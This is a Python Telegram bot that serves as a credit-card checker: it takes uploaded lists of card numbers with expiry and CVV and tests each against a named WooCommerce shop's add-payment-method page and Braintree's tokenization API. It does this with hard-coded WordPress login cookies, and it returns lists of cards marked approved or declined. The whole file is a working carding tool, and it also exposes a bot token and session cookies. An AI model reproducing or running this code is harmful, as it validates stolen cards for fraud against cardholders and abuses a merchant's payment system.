import requests
import telebot, time
from telebot import types
import os
import re
import random
import string
import base64
from bs4 import BeautifulSoup

# Telegram bot setup
token = '7740019431:AAHS6y9DGxkjPHgusKQh6GIM2wRKIHDO2EU'  # Replace with your actual bot token
bot = telebot.TeleBot(token, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Send the file now.")

@bot.message_handler(content_types=["document"])
def main(message):
    dd = 0
    live = 0
    ko = bot.reply_to(message, "Checking Your Cards...⌛").message_id
    document = bot.get_file(message.document.file_id)
    file_content = bot.download_file(document.file_path)
    
    with open("combo.txt", "wb") as combo_file:
        combo_file.write(file_content)
    
    approved_cards = []
    declined_cards = []
    
    try:
        with open("combo.txt", 'r') as file:
            cards = file.readlines()
            total = len(cards)
            
            for idx, card in enumerate(cards, start=1):
                card = card.strip()
                if not card:
                    continue  # Skip empty lines
                
                try:
                    result = Tele(card)  # Call the Tele function for each card

                    if result == "Approved":
                        live += 1
                        approved_cards.append(f"{card} | Approved")
                    else:
                        dd += 1
                        declined_cards.append(f"{card} | {result}")

                except Exception as e:
                    declined_cards.append(f"{card} | Error: {str(e)}")
                
                # Update progress dynamically
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• TOTAL 👻 ➜ [ {total} ] •", callback_data=f'total_{total}')
                cm3 = types.InlineKeyboardButton(f"• Approved ✅ ➜ [ {live} ] •", callback_data=f'approved_{live}')
                cm4 = types.InlineKeyboardButton(f"• Declined ❌ ➜ [ {idx} ] •", callback_data=f'declined_{dd}')
                stop = types.InlineKeyboardButton(f"[ STOP ]", callback_data='stop')
                mes.add(cm1, cm3, cm4, stop)
                
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, 
                                      text=f'Processing card, please wait', reply_markup=mes)
                time.sleep(2)  # Simulate delay

    except Exception as e:
        bot.reply_to(message, f"Error processing cards: {str(e)}")
    
    # Write approved and declined cards to separate files
    with open("approved_cards.txt", "w") as approved_file:
        approved_file.write("\n".join(approved_cards))
    
    with open("declined_cards.txt", "w") as declined_file:
        declined_file.write("\n".join(declined_cards))

    # Send back the files to the user
    if approved_cards:
        with open("approved_cards.txt", "rb") as approved_file:
            bot.send_document(message.chat.id, approved_file)
    
    if declined_cards:
        with open("declined_cards.txt", "rb") as declined_file:
            bot.send_document(message.chat.id, declined_file)

    # Final message after all processing
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, 
                                      text=f'Processing complete.', reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    with open("stop.stop", "w") as file:
        pass

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]

    with open('fileb3.txt', 'r') as file:
        first_line = file.readline()
    
    while True:
        lines = '''hxhcdrr%7C1713641609%7CXOJGK2xFYyXD6Wom3p2Cujj2ZkzyHqXGk13kFuIl5z2%7Cedf540bbe280f3cab93eebcbdb30556e244f9cbfd6b72021d7ea61d6330bc024
                   jsnxuwv%7C1713641702%7CLuntNS8UCY3lTvN6Yq0pXDIWhRoQN6T2rIJcVUYHqrW%7C81172a53f2d4f6da23bb1b177581990c34ac15331baad10c4d3bad3500cd0559'''
        lines = lines.strip().split('\n')
        random_line_number = random.randint(0, len(lines) - 1)
        big = lines[random_line_number]
        if big == first_line:
            pass
        else:
            break

    with open('fileb3.txt', 'w') as file:
        file.write(big)

    cookies = {
        '_ga': 'GA1.1.774315979.1711878714',
        'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
    }

    response = requests.get('https://www.huntingtonacademy.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
    add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
    dec = base64.b64decode(enc).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

    headers = {
        'authority': 'payments.braintree-api.com',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '698e6aaa-6b50-4bf0-adc4-d454c57ef68a',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {'postalCode': '11743'},
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tok = response.json()['data']['tokenizeCreditCard']['token']

    result = "Error"
    response = requests.post(
        'https://www.huntingtonacademy.com/my-account/add-payment-method/',
        cookies=cookies,
        headers=headers,
        data={'payment_method': 'braintree_cc', 'braintree_cc_nonce_key': tok, 'woocommerce-add-payment-method-nonce': add_nonce}
    )
    
    text = response.text
    match = re.search(r'Reason: (.+?)\s*</li>', text)
    if match:
        result = match.group(1)
    elif 'Payment method successfully added.' in text:
        result = "Approved"
    elif 'risk_threshold' in text:
        result = "RISK: Retry this BIN later."
    elif 'Please wait for 20 seconds.' in text:
        result = "try again"
    
    if 'Approved' in result or 'Insufficient Funds' in result:
        return 'Approved'
    else:
        return result

print("Bot is running...")
bot.polling()
